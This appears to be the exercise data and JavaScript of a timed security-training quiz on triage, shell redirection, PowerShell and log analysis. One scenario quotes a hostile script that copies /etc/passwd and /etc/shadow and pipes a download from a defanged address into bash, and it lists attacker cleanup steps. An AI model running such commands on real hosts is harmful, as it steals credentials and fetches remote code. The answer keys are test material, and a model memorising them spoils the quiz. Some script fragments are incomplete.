{id:'m23',type:'qcm',theme:'Analysis Methods',title:'First commands on a suspect host',
scenario:'You have five minutes of console access on a suspect Linux server before the network team isolates it. You want the most valuable volatile evidence first: what is running and what is it connected to.',
question:'Which pair of commands best captures that volatile picture?',
hint:'Volatile = disappears on reboot. Processes and connections are the two classics.',
choices:[
 {t:'ps aux and ss -tunlp',ok:true,fb:''},
 {t:'df -h and ls /home',ok:false,fb:'Disk usage and home listings are stable data \u2014 they survive a reboot, so they are not the volatile priority.'},
 {t:'cat /etc/passwd and id',ok:false,fb:'Local accounts rarely change during an attack; these can wait. Live state cannot.'},
 {t:'uptime and hostname',ok:false,fb:'Both are useful context but neither shows running software or connections.'}],
expl:'Volatile data is data that disappears with a reboot or a logout: running processes and live network connections. ps aux snapshots the processes (with their command lines), ss -tunlp snapshots the open sockets and the process that owns each one. Files like /etc/passwd or home directories are on disk and can be collected later.'},
{id:'m24',type:'scenario',theme:'Analysis Methods',title:'One script, two points of view',
scenario:'EDR caught this script on a developer workstation:\n\n#!/bin/bash\ncat /etc/passwd > /tmp/.cache\ncat /etc/shadow >> /tmp/.cache 2>/dev/null\ncurl -s hxxp://203[.]0[.]113[.]9/up.sh | bash\n\nBlue team sees the alert first. Later, threat intel asks the red-team desk how the attacker will likely behave next.',
question:'Answer first as the blue-team analyst, then as the red-team thinker.',
hint:'Reading account files and pulling a second stage from outside is staging plus download. From the attacker\u2019s view, the dropped files and the history trail are the loose ends.',
parts:[
 {label:'Blue team \u2014 what is this script doing?',choices:[
  {t:'Collecting account data and downloading a second stage to execute \u2014 this is staging plus a download cradle.',ok:true,fb:''},
  {t:'A normal backup job: it simply copies password files into a cache file and refreshes an internal tool.',ok:false,fb:'Backups never read /etc/shadow and pipe downloads straight into bash.'},
  {t:'A broken update script \u2014 the hidden errors show that it never worked properly anywhere.',ok:false,fb:'The 2>/dev/null hides errors on purpose; the sequence is deliberate, not broken.'},
  {t:'A penetration test that the internal red team left running without a change ticket.',ok:false,fb:'Never assume. Real tests come with tickets and scopes \u2014 and none is mentioned.'}]},
 {label:'Red team \u2014 what will the attacker most likely do next to stay hidden?',choices:[
  {t:'Delete the dropped files and clear their entries from shell history and the download cache.',ok:true,fb:''},
  {t:'Email the SOC a polite summary of exactly what the script did on the host.',ok:false,fb:'Attackers do not announce. Expect clean-up, not disclosure.'},
  {t:'Reboot the machine afterwards so that the local logs rotate faster and look clean.',ok:false,fb:'Rebooting loses their own running sessions \u2014 not a typical hiding move.'},
  {t:'Install a few more antivirus updates on the host to blend in with normal traffic.',ok:false,fb:'Updating defender tooling helps the blue team, not the attacker.'}]}],
expl:'Blue view: the script stages sensitive files (/etc/passwd, then /etc/shadow, errors hidden with 2>/dev/null) into /tmp/.cache and pulls a second stage with curl | bash \u2014 collection plus download, a textbook hostile pattern. Red view: the artefacts left on disk (.cache, the script itself, bash history with the curl line) are the traces an actor removes to slow detection.'}
,
{id:'m25',type:'qcm',theme:'Shell Scripting Basics',title:'What did the script report?',
scenario:'Your wrapper script runs ./scan.sh and then reads the special variable $? to decide whether to raise a ticket automatically. scan.sh ends with the line exit 3.',
question:'What does $? contain after scan.sh finishes, and what does it mean?',
hint:'The exit command sets the status. Convention: zero is good, anything else is a problem code.',
choices:[
 {t:'It contains 3, a non-zero code that means the script failed or hit a problem.',ok:true,fb:''},
 {t:'It contains 0, because the script reached its last line without crashing.',ok:false,fb:'Reaching exit 3 is reaching the end \u2014 and that exit command sets the code to 3, not 0.'},
 {t:'It contains the text of the last error message printed by the script.',ok:false,fb:'Exit codes are numbers. Error text goes to stderr, not into $?.'},
 {t:'It contains the number of lines the script processed.',ok:false,fb:'Line counts live in variables you build yourself; $? only holds the exit status.'}],
expl:'Every script ends with an exit status. exit 3 deliberately sets it to 3, and $? holds that value afterwards. By convention 0 means success and any non-zero value means a specific problem \u2014 scripts and monitoring use this to branch automatically. Wrappers test $? with if [ $? -eq 0 ] to decide what to do next.'},
{id:'m26',type:'branch',theme:'Analysis Methods',title:'Beacon on wks-4421 \u2014 decide as it happens',
scenario:'15:04 \u2014 EDR shows wks-4421 (finance workstation) sending small HTTPS requests to an unknown address every 60 seconds. You are the on-call responder. Each decision shapes the next step.',
question:'Choose the best action at each of the three decision points.',
hint:'Contain before you clean. Memory and live state die with the power. Removal comes after you understand what you are removing.',
parts:[
 {label:'Step 1 \u2014 the host is still beaconing to the internet. First move?',choices:[
  {t:'Isolate the workstation on the network (keep it powered on) and confirm with the network team.',ok:true,res:'Good: the beacon dies at the switch while the evidence stays alive in memory.',fb:''},
  {t:'Shut the workstation down immediately so the attacker loses access to it.',ok:false,res:'The beacon stops \u2014 and so does every trace in memory. Disk-only forensics now.',fb:'Shutting down destroys the most valuable evidence: RAM and live connections.'},
  {t:'Watch the beacon quietly for an hour to collect a bigger set of samples.',ok:false,res:'The actor notices the attention and starts cleaning up or moves sideways.',fb:'Watching an active compromise lets the attacker deepen their foothold.'},
  {t:'Email the user right away to ask whether they are doing anything unusual today.',ok:false,res:'The user replies "just Excel" \u2014 and the beacon continues meanwhile.',fb:'Users rarely know their host is compromised; contain first, ask later.'}]},
 {label:'Step 2 \u2014 the host is isolated but powered on. What now?',choices:[
  {t:'Collect volatile data first: memory, running processes and live connections from the still-running host.',ok:true,res:'You now own the RAM picture, the process list and the socket table \u2014 the strongest evidence set.',fb:''},
  {t:'Pull a full disk image first; the memory capture can safely wait until tomorrow.',ok:false,res:'The image is taken, but the processes and connections that explained it are gone after the overnight shutdown.',fb:'Disk data survives a reboot; memory does not. Volatile first.'},
  {t:'Run a full antivirus scan of the disk and reboot the host if it finds nothing at all.',ok:false,res:'The scan misses the custom implant and the reboot wipes the live state.',fb:'Scans are useful but secondary; never reboot before volatile collection.'},
  {t:'Delete the suspicious process straight away with a kill command from the console.',ok:false,res:'The process dies and with it the proof of what it was doing.',fb:'Killing destroys the very thing you need to analyse. Collect first.'}]},
 {label:'Step 3 \u2014 evidence is collected. How do you close the incident?',choices:[
  {t:'Hunt persistence (cron, startup items, scheduled tasks), remove it, then rotate the user\u2019s credentials.',ok:true,res:'The foothold is removed and stolen credentials stop working. Clean close.',fb:''},
  {t:'Rotate the user password only \u2014 the persistence hunt can safely wait until next month.',ok:false,res:'The password changes, but the implant logs back in with its scheduled task.',fb:'Persistence you leave behind survives every password change.'},
  {t:'Reimage the workstation and move on quickly without any further checks anywhere.',ok:false,res:'This workstation is clean, but the same persistence may exist elsewhere \u2014 and you never looked.',fb:'Reimaging one host does not answer how it got in or who else is hit.'},
  {t:'Leave everything running as it is and simply monitor the host for a week.',ok:false,res:'The beacon returns on Monday morning with new tasks.',fb:'Monitoring an uncleaned host is monitoring the attacker\u2019s progress.'}]}],
expl:'Response order matters: contain (isolate, keep power on), collect (memory and live state before anything kills them), then remediate (find and remove persistence, rotate credentials). Shutting down or killing processes early destroys exactly the evidence you will need next. And a clean close always includes persistence hunting \u2014 implants return through whatever door you leave open.'},
{id:'m27',type:'match',theme:'PowerShell',title:'Same job, two shells',
scenario:'You support a mixed estate: Linux servers and Windows workstations. To triage both without switching brains, you map your usual Linux tools to their PowerShell twins.',
question:'Match each bash command with its PowerShell equivalent.',
hint:'Read the verbs: cat reads, grep searches, ps lists processes, kill stops, ls lists a directory.',
items:[
 {t:'cat file',bin:0,fb:'Get-Content file reads a file\u2019s lines, like cat.'},
 {t:'grep pattern file',bin:1,fb:'Select-String -Pattern pattern -Path file is the PowerShell grep.'},
 {t:'ps aux',bin:2,fb:'Get-Process lists running processes with their resource use.'},
 {t:'kill 1234',bin:3,fb:'Stop-Process -Id 1234 ends the process with that PID.'},
 {t:'ls /var/log',bin:4,fb:'Get-ChildItem C:\\Logs lists directory contents.'}],
bins:['Get-Content file','Select-String -Pattern "..." -Path file','Get-Process','Stop-Process -Id 1234','Get-ChildItem C:\\Logs'],
expl:'The mapping is almost word for word: cat \u2192 Get-Content, grep \u2192 Select-String, ps aux \u2192 Get-Process, kill PID \u2192 Stop-Process -Id, ls \u2192 Get-ChildItem. The PowerShell versions return objects, so you can filter with Where-Object instead of re-parsing text. PowerShell also answers to short aliases (cat and ps really work there), but the Verb-Noun names are the real ones. For remote Windows hosts you triage over remoting: Enter-PSSession opens an interactive shell, Invoke-Command runs one command \u2014 both ride on WinRM. Learning the pairs lets you triage a mixed estate with one mental model.'},
{id:'m28',type:'fill',theme:'Shell Scripting Basics',title:'Redirect like an incident note',
scenario:'You are writing the evidence-collection note for the ticket. It must say how to save a script\u2019s output together with its errors into one file, and how to add a line to an existing notes file without destroying it.',
question:'Complete the three redirection pieces.',
hint:'> writes stdout to a file. 2>&1 folds the error stream (2) into the output stream (1). >> appends instead of overwriting.',
text:'./collect.sh {{0}} out.log {{1}} saves output and errors together in out.log\necho "collection done" {{2}} notes.txt adds a line without overwriting',
slots:['>','2>&1','>>'],
bank:['>','2>&1','>>','2>1','<<','>|'],
expl:'./collect.sh > out.log 2>&1 is the classic "capture everything": > sends standard output to the file, and 2>&1 redirects the error stream (file descriptor 2) to wherever standard output (1) goes. The three streams have numbers: 0 is stdin (input), 1 is stdout, 2 is stderr. echo ... >> notes.txt appends a line; a single > would wipe the file first. 2>1 is the classic typo \u2014 it writes errors to a file named 1.'},
{id:'m29',type:'logview',theme:'PowerShell',title:'Windows logons gone wrong',
scenario:'A Windows admin exported the Security event log slice to a text file for you. You are looking for brute-force patterns against the server FS-01.',
log:{file:'security-export.log \u2014 FS-01 (Event 4625 = failed logon)',lines:[
 {t:'2026-03-14 08:01:11  EventID:4625  Account:ALICE  Workstation:WS-77  Source:10[.]0[.]9[.]31  Status:0xC000006A (wrong password)',k:'bad'},
 {t:'2026-03-14 08:01:14  EventID:4625  Account:ALICE  Workstation:WS-77  Source:10[.]0[.]9[.]31  Status:0xC000006A (wrong password)',k:'bad'},
 {t:'2026-03-14 08:01:20  EventID:4624  Account:ALICE  Workstation:WS-77  Source:10[.]0[.]9[.]31  Status:success',k:'good'},
 {t:'2026-03-14 08:03:02  EventID:4625  Account:Administrator  Workstation:-  Source:198[.]51[.]100[.]23  Status:0xC000006A (wrong password)',k:'bad'},
 {t:'2026-03-14 08:03:05  EventID:4625  Account:Administrator  Workstation:-  Source:198[.]51[.]100[.]23  Status:0xC000006A (wrong password)',k:'bad'},
 {t:'2026-03-14 08:03:09  EventID:4625  Account:ADMIN  Workstation:-  Source:198[.]51[.]100[.]23  Status:0xC000006A (wrong password)',k:'bad'},
 {t:'2026-03-14 08:03:12  EventID:4625  Account:administrator  Workstation:-  Source:198[.]51[.]100[.]23  Status:0xC0000064 (no such user)',k:'bad'},
 {t:'2026-03-14 08:03:18  EventID:4625  Account:Administrator  Workstation:-  Source:198[.]51[.]100[.]23  Status:0xC000006A (wrong password)',k:'bad'},
 {t:'2026-03-14 08:05:40  EventID:4624  Account:svc_sql  Workstation:APP01  Source:10[.]0[.]9[.]60  Status:success',k:'good'},
 {t:'2026-03-14 08:07:55  EventID:4625  Account:Administrator  Workstation:-  Source:198[.]51[.]100[.]23  Status:0xC000006A (wrong password)',k:'bad'}]},
question:'Use the filter if you need it. Which account is the external source at 198[.]51[.]100[.]23 targeting, and what does the pattern look like?',
hint:'Filter for 198[.]51[.]100[.]23 and watch the Account and Workstation columns across time.',
choices:[
 {t:'Administrator \u2014 repeated failures from one external address with no workstation name.',ok:true,fb:''},
 {t:'ALICE \u2014 the two failures at 08:01 are the start of the same attack against her account.',ok:false,fb:'ALICE failed twice from an internal workstation and then logged on successfully \u2014 a mistyped password, not an attack.'},
 {t:'svc_sql \u2014 the successful 4624 logon from APP01 completes the compromise of the server.',ok:false,fb:'svc_sql logged on successfully from an internal host; it is normal service traffic in this slice.'},
 {t:'No pattern \u2014 two different accounts failing in the same minute means random background noise.',ok:false,fb:'The failures share the same external source, target the same account, and have no workstation name. That is a pattern.'}],
expl:'Every 4625 for Administrator comes from 198[.]51[.]100[.]23 with an empty Workstation field \u2014 typical of scripts doing password guessing from outside. ALICE\u2019s two failures end in a successful logon from her own workstation (a typo), and svc_sql is normal service activity. This is event correlation in practice: pairing the account with the source address and the workstation field across time before you call it an attack.'},
{id:'m30',type:'match',theme:'Regular Expressions',title:'Shorthand classes',
scenario:'Your grep -E playbook uses shorthand classes everywhere. A teammate asked what each shorthand actually stands for before they trust the detections.',
question:'Match each shorthand with its meaning.',
hint:'d like digit, w like word character, s like space. \\b is an invisible fence between word and non-word. A negated class matches everything except its members.',
items:[
 {t:'\\d',bin:0,fb:'\\d matches one digit, 0\u20139 \u2014 the same as [0-9].'},
 {t:'\\w',bin:1,fb:'\\w matches one word character: letters, digits or underscore.'},
 {t:'\\s',bin:2,fb:'\\s matches one whitespace character: space, tab or newline.'},
 {t:'\\b',bin:3,fb:'\\b is a word boundary: the invisible edge between a word character and a non-word character.'},
 {t:'[^0-9]',bin:4,fb:'A negated class: matches any single character that is NOT a digit.'}],
bins:['One digit (0\u20139)','One letter, digit or underscore','One space, tab or newline','The edge between a word and a non-word character','One character that is not a digit'],
expl:'\\d is one digit; \\w is one letter, digit or underscore; \\s is one whitespace character. \\b is different \u2014 it matches a position, not a character: the boundary at the edge of a word, which is how you match "log" without catching "login". [^0-9] is a negated character class: any single character except a digit. From these blocks you assemble the common detection patterns \u2014 IP addresses, email addresses, password hashes \u2014 exactly the shapes in this file.'},
{id:'m31',type:'scenario',theme:'Analysis Methods',title:'CPU spike vs the baseline',
scenario:'Your monitoring plan keeps a baseline: db01 normally runs at 12\u201318% CPU, its backup job (pg_backup) adds short spikes to 70% at 01:00, and nothing else crosses 30%. Now, at 14:20, top shows:\n\n  PID USER      %CPU COMMAND\n  812 postgres  14.1 postgres\n  947 miner    287.3 /tmp/xmrig-cpu\n 1031 root       0.9 crond\n 1104 alopez     1.2 bash',
question:'Use the baseline and the snapshot. Answer the two questions.',
hint:'Compare each process with the baseline document, not with "feels high". Then choose the response that keeps evidence.',
parts:[
 {label:'Which process breaks the baseline, and why?',choices:[
  {t:'/tmp/xmrig-cpu at 287% \u2014 it is unknown, runs from /tmp, and dwarfs every normal spike.',ok:true,fb:''},
  {t:'postgres at 14.1% CPU \u2014 it sits above the documented 12% floor for db01.',ok:false,fb:'14% is inside the documented 12\u201318% normal band for db01.'},
  {t:'crond at 0.9% CPU \u2014 cron should normally sit completely idle between jobs.',ok:false,fb:'cron runs constantly at low CPU; 0.9% is normal and expected.'},
  {t:'bash at 1.2% CPU \u2014 interactive shells are never allowed on database servers.',ok:false,fb:'Admin shells are normal; the baseline documents logins, not a zero-shell rule.'}]},
 {label:'What do you do first?',choices:[
  {t:'Snapshot the process details (command line, open files, connections) before any cleanup.',ok:true,fb:''},
  {t:'Delete /tmp/xmrig-cpu from the disk and move on to the next alert.',ok:false,fb:'Deleting the file destroys the artefact and answers nothing about how it arrived.'},
  {t:'Restart db01 as soon as possible to clear the heavy CPU load.',ok:false,fb:'A reboot kills the live process state \u2014 the fastest way to lose the trail.'},
  {t:'Raise the baseline threshold to 300% CPU so that the alerts stop firing.',ok:false,fb:'Changing the baseline to silence an alarm is how real problems get ignored.'}]}],
expl:'The baseline says db01 lives between 12% and 18%, with known spikes from pg_backup only. A process at 287% named xmrig-cpu \u2014 a known cryptomining family \u2014 running from /tmp is far outside any documented behaviour. Postgres, crond and the shell all sit inside their normal picture. First response: capture the live details of the process (command line, open files, network) so the cleanup later is informed and the report has evidence.'},
{id:'m32',type:'fill',theme:'Analysis Methods',title:'Write the must-gather runbook',
scenario:'You are writing the must-gather runbook for Linux hosts. Each command saves its output into a dated file so nothing is lost and nothing overwrites anything else. The two commands must not clobber each other\u2019s files.',
question:'Complete the two redirection symbols.',
hint:'The first command creates its file fresh with >. The second appends to its own separate file with >>.',
text:'ps aux {{0}} proc_$(date +%F).txt\nss -tunap {{1}} net_$(date +%F).txt',
slots:['>','>>'],
bank:['>','>>','2>&1','<','tee','-a'],
expl:'ps aux > proc_$(date +%F).txt writes the process snapshot into a new, dated file \u2014 $(date +%F) inserts today\u2019s date, so each run gets its own file. ss -tunap >> net_$(date +%F).txt appends the connection table to its file: if the runbook runs twice, nothing is lost. Keeping separate files per data type also stops one command from overwriting another\u2019s evidence.'}
];

var TIMER_TOTAL = 3043;
var passMark = META.passMark, NQ = EXERCISES.length;
function $(s,r){return (r||document).querySelector(s);}
function $all(s,r){return Array.prototype.slice.call((r||document).querySelectorAll(s));}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function shuf(a){a=a.slice();for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1)),t=a[i];a[i]=a[j];a[j]=t;}return a;}
function fmt(sec){var m=Math.floor(sec/60),s=sec%60;return (m<10?'0':'')+m+':'+(s<10?'0':'')+s;}
function r1(x){return Math.round(x*10)/10;}
var ICON={ok:'\u2713',bad:'\u2717',warn:'\u26a0'};
var WORD={ok:'correct',bad:'wrong',warn:'missed'};
function mk(kind){return ' <span class="mk mk-'+kind+'">'+ICON[kind]+' '+WORD[kind]+'</span>';}
var SEV = (META.difficulty==='hard')?'HARD':'MEDIUM';
var SEVCLS = (SEV==='HARD')?'sev-hard':'sev-medium';
var S = {phase:'intro',order:[],idx:0,ans:{},remaining:TIMER_TOTAL,tid:null,pauseM:false,pauseC:false,reported:false,user:''};
function ansOf(i){var id=S.order[i];if(!S.ans[id]){S.ans[id]={};}return S.ans[id];}
function curEx(){return EXERCISES[S.order[S.idx]];}
var stageApi=null;
/* ---------- timer & pause ---------- */
function startTimer(){if(S.tid){clearInterval(S.tid);}S.tid=setInterval(tick,1000);}
function tick(){
  if(S.phase!=='run')return;
  if(S.pauseM||S.pauseC){return;}
  S.remaining--;
  if(S.remaining<=0){S.remaining=0;renderTimer();finish(true);return;}
  renderTimer();
}
function renderTimer(){
  var t=$('#timer');t.textContent=fmt(S.remaining);
  $('#timerbox').classList.toggle('low',S.remaining<=300);
}
function renderPauseState(){
  var el=$('#pausestate'),parts=[];
  if(S.pauseM)parts.push('\u23f8 Paused (manual)');
  if(S.pauseC)parts.push('\u23f1 Timer paused \u2014 review mode');
  if(parts.length&&S.phase==='run'){el.hidden=false;el.textContent=parts.join('  \u00b7  ');el.className='pausestate '+(S.pauseM&&S.pauseC?'both':(S.pauseM?'manual':'check'));}
  else{el.hidden=true;}
  var bl=S.pauseM&&S.phase==='run';
  $('#stage').classList.toggle('blurred',bl);
  $('#pauseoverlay').classList.toggle('show',bl);
  $('#btn-pause').setAttribute('aria-pressed',S.pauseM?'true':'false');
  $('#btn-pause').textContent=S.pauseM?'Resume':'Pause';
}
/* ---------- header rendering ---------- */
function renderScore(){
  var e=0;for(var k in S.ans){if(S.ans[k].committed){e+=S.ans[k].committed.earned;}}
  $('#score').textContent=String(r1(e));
}
function doneCount(){var c=0;for(var k in S.ans){if(S.ans[k].committed||S.ans[k].status==='skipped')c++;}return c;}
function renderProgress(){
  var c=doneCount();
  $('#progressbar').style.width=(NQ?Math.round(c/NQ*100):0)+'%';
  $('#progresstext').textContent=c+' of '+NQ+' exercises handled \u00b7 pass mark '+passMark+'%';
}
function navState(pos){
  var a=S.ans[S.order[pos]];
  if(pos===S.idx)return 'cur';
  if(!a||(!a.committed&&a.status!=='skipped'))return '';
  if(a.status==='skipped')return 'skipped';
  if(a.label==='full')return 'done-ok';
  if(a.label==='partial')return 'done-part';
  return 'done-zero';
}
function navWord(pos){
  var st=navState(pos);
  if(st==='skipped')return ' (skipped)';
  if(st==='done-ok')return ' (answered, full credit)';
  if(st==='done-part')return ' (answered, partial credit)';
  if(st==='done-zero')return ' (answered, zero)';
  if(st==='cur')return ' (current)';
  return ' (not answered yet)';
}
function navTitle(pos){
  var st=navState(pos);
  if(st==='skipped')return 'Skipped';
  if(st==='done-ok')return 'Full credit';
  if(st==='done-part')return 'Partial credit';
  if(st==='done-zero')return 'Zero';
  if(st==='cur')return 'Current';
  return 'Not answered';
}
function renderNav(){
  var nav=$('#navigator');nav.innerHTML='';
  for(var p=0;p<NQ;p++){
    var b=document.createElement('button');
    b.type='button';b.className='nav-chip '+navState(p);
    b.textContent=String(p+1);
    b.setAttribute('aria-label','Go to exercise '+(p+1)+navWord(p));
    b.title=navTitle(p);
    (function(pos){b.addEventListener('click',function(){if(S.phase!=='run')return;S.pauseC=false;showEx(pos);});})(p);
    nav.appendChild(b);
  }
}
function renderThemeProgress(){
  var body=$('#themeprogbody');body.innerHTML='';
  var th={};
  for(var i=0;i<EXERCISES.length;i++){var ex=EXERCISES[i];th[ex.theme]=th[ex.theme]||{t:0,c:0};th[ex.theme].t++;
    var a=S.ans[i];if(a&&a.committed&&a.label==='full')th[ex.theme].c++;}
  for(var name in th){
    var d=document.createElement('div');d.className='tp-item';
    d.innerHTML=esc(name)+': <b>'+th[name].c+'/'+th[name].t+'</b> full';
    body.appendChild(d);
  }
}
/* ---------- small helpers ---------- */
var _pd=document.createElement('div');
function plain(html,max){_pd.innerHTML=html;var t=(_pd.textContent||'').replace(/\s+/g,' ').trim();if(max&&t.length>max)t=t.slice(0,max-1)+'\u2026';return t;}
function el(tag,cls,html){var d=document.createElement(tag);if(cls)d.className=cls;if(html!=null)d.innerHTML=html;return d;}

/* ---------- exercise shell ---------- */

  ab.appendChild(ansLabel(typeLbl));

  var bSkip=el('button','btn','Skip');bSkip.id='btn-skip';bSkip.setAttribute('data-testid','skip');
  var bHint=el('button','btn ghost','Hint (\u221210%)');bHint.id='btn-hint';

    api.clearMarks();

    $('#btn-hint').disabled=!!a.hint;
    a.committed=null;
    flash.textContent='Answer unlocked \u2014 press Check again to re-grade.';
  });
  bNext.addEventListener('click',goNext);

/* ---------- choice family ---------- */
function buildChoices(area,ex,multi,name){
  var wrap=el('div','choices');wrap.setAttribute('role',multi?'group':'radiogroup');
  var idxs=shuf(ex.choices.map(function(c,i){return i;}));
  var inputs=[];
  idxs.forEach(function(ci){
    var c=ex.choices[ci];
    var lab=el('label','choice');lab.setAttribute('data-ok',c.ok?'1':'0');
    var inp=document.createElement('input');
    inp.type=multi?'checkbox':'radio';inp.name=name;inp.value=String(ci);
    inp.addEventListener('change',function(){$all('input',wrap).forEach(function(o){o.closest('.choice').classList.toggle('sel',o.checked);});});
    lab.appendChild(inp);
    lab.appendChild(el('span',null,c.t));
    lab.appendChild(el('span','mkslot',''));
    wrap.appendChild(lab);inputs.push(inp);
  });
  area.appendChild(wrap);
  return {wrap:wrap,inputs:inputs,byVal:function(v){for(var i=0;i<inputs.length;i++){if(inputs[i].value===String(v))return inputs[i];}return null;}};
}
function gradeChoice(ex,ex2,inp,multi){
  var sel=[],okIdx=[];
  ex.choices.forEach(function(c,i){if(c.ok)okIdx.push(i);});
  inp.forEach(function(o){if(o.checked)sel.push(parseInt(o.value,10));});
  var okCount=okIdx.length;
  var hit=0;
  sel.forEach(function(ci){if(ex.choices[ci].ok)hit++;});
  var earned=multi?(okCount?hit/okCount:0):(sel.length===1&&ex.choices[sel[0]].ok?1:0);
  var tips=[];
  sel.forEach(function(ci){if(!ex.choices[ci].ok&&ex.choices[ci].fb)tips.push(plain(ex.choices[ci].fb,160));});
  return {earned:earned,sel:sel,okIdx:okIdx,tips:tips};
}
function markChoices(ex,wrap,inp,res,multi){
  inp.forEach(function(o){
    var ci=parseInt(o.value,10);var lab=o.closest('.choice');var slot=lab.querySelector('.mkslot');
    slot.innerHTML='';
    lab.classList.remove('m-ok','m-bad','m-warn');
    var isOk=ex.choices[ci].ok,isSelected=o.checked;
    if(isOk&&isSelected){lab.classList.add('m-ok');slot.innerHTML=mk('ok');}
    else if(isOk&&!isSelected&&multi){lab.classList.add('m-warn');slot.innerHTML=mk('warn');}
    else if(!isOk&&isSelected){lab.classList.add('m-bad');slot.innerHTML=mk('bad');}
    if(!multi&&isOk&&!isSelected){lab.classList.add('m-ok');slot.innerHTML=mk('ok');}
  });
}
function sumChoices(ex,sel){
  if(!sel.length)return '(nothing selected)';
  return sel.map(function(ci){return plain(ex.choices[ci].t,70);}).join(' | ');
}
function sumCorrect(ex){var a=[];ex.choices.forEach(function(c){if(c.ok)a.push(plain(c.t,70));});return a.join(' | ');}
/* ---------- per-type renderers ---------- */
var RENDER={};
RENDER.qcm=function(area,ex){
  var b=buildChoices(area,ex,false,'q'+S.idx);
  return {
    live:function(){var s=[];b.inputs.forEach(function(o){if(o.checked)s.push(parseInt(o.value,10));});return s.length?{q:s[0]}:null;},
    restore:function(s){b.inputs.forEach(function(o){o.checked=(s&&s.q===parseInt(o.value,10));o.closest('.choice').classList.toggle('sel',o.checked);});},
    grade:function(){
      var res=gradeChoice(ex,null,b.inputs,false);
      markChoices(ex,b.wrap,b.inputs,res,false);
      var sel=res.sel;
      return {earned:res.earned,
        answerSummary:sumChoices(ex,sel),
        correctSummary:sumCorrect(ex),
        tips:res.tips};
    },
    clearMarks:function(){b.inputs.forEach(function(o){var lab=o.closest('.choice');lab.classList.remove('m-ok','m-bad','m-warn');lab.querySelector('.mkslot').innerHTML='';});}
  };
};

    live:function(){var s=[];b.inputs.forEach(function(o){if(o.checked)s.push(parseInt(o.value,10));});return s.length?{q:s}:null;},

    grade:function(){
      var res=gradeChoice(ex,null,b.inputs,true);
      markChoices(ex,b.wrap,b.inputs,res,true);
      return {earned:res.earned,
        answerSummary:sumChoices(ex,res.sel),
        correctSummary:sumCorrect(ex),
        tips:res.tips};

RENDER.scenario=function(area,ex){
  var parts=ex.parts,apis=[];
  parts.forEach(function(p,pi){
    area.appendChild(el('p','ansnote','<b>Item '+(pi+1)+':</b> '+p.label));
    var b=buildChoices(area,{choices:p.choices},false,'p'+S.idx+'_'+pi);
    apis.push(b);
  });
  return {
    live:function(){var s=[];apis.forEach(function(b){var v=null;b.inputs.forEach(function(o){if(o.checked)v=parseInt(o.value,10);});s.push(v);});return s.some(function(v){return v!=null;})?{p:s}:null;},
    restore:function(s){apis.forEach(function(b,pi){var v=s&&s.p?s.p[pi]:null;b.inputs.forEach(function(o){o.checked=(v===parseInt(o.value,10));o.closest('.choice').classList.toggle('sel',o.checked);});});},
    grade:function(){
      var earned=0,tips=[],selTxt=[],corTxt=[];
      parts.forEach(function(p,pi){
        var chosen=null,okCi=null;
        p.choices.forEach(function(c,ci){if(c.ok)okCi=ci;});
        apis[pi].inputs.forEach(function(o){if(o.checked)chosen=parseInt(o.value,10);});
        var lab=apis[pi].inputs[0]?apis[pi].inputs[0].closest('.choice').parentElement:null;
        apis[pi].inputs.forEach(function(o){
          var ci=parseInt(o.value,10);var L=o.closest('.choice');var slot=L.querySelector('.mkslot');
          slot.innerHTML='';L.classList.remove('m-ok','m-bad','m-warn');

        });
        if(chosen===okCi)earned+=1/parts.length;
        selTxt.push('Item '+(pi+1)+': '+(chosen==null?'(no answer)':plain(p.choices[chosen].t,60)));
        corTxt.push('Item '+(pi+1)+': '+plain(p.choices[okCi].t,60));
      });
      return {earned:earned,answerSummary:selTxt.join(' \u00b7 '),correctSummary:corTxt.join(' \u00b7 '),tips:tips};
    },
    clearMarks:function(){apis.forEach(function(b){b.inputs.forEach(function(o){var L=o.closest('.choice');L.classList.remove('m-ok','m-bad','m-warn');L.querySelector('.mkslot').innerHTML='';});});}
  };
